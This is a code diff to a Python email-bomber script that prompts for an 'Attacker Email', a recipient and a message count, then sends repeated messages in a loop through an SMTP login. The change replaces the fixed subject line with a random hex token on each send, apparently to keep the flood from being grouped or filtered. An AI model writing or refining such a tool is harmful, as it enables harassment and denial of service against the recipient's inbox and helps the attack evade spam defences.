@@ -4,6 +4,7 @@ import sys
 import os
 import smtplib
 from email.mime.text import MIMEText
+import secrets
 
 os.system('cls')
 
@@ -32,7 +33,7 @@ def mail():
     email = input('\nAttacker Email: ')
     password = getpass('\nAttacker Password: ')
     to = input('\nRecipient Email: ')
-    subject = input('\nSubject: ')
+    # subject = input('\nSubject: ')
     mssg = MIMEText(input('\nMessage: '))
     number = input('\nNumber of Emails: ')
     smtp = input('\nSMTP Server (smtp.(your_input).com): ')
@@ -45,6 +46,7 @@ def mail():
         server.starttls()
         server.login(email, password)
         for i in range(1, int(number) + 1):
+            subject = secrets.token_hex(5)
             msg = f'Subject: {subject}\nFrom: {user}\nMessage: {mssg}'
             server.sendmail(email, to, msg)
             print("\rE-mails sent: %i" % i)
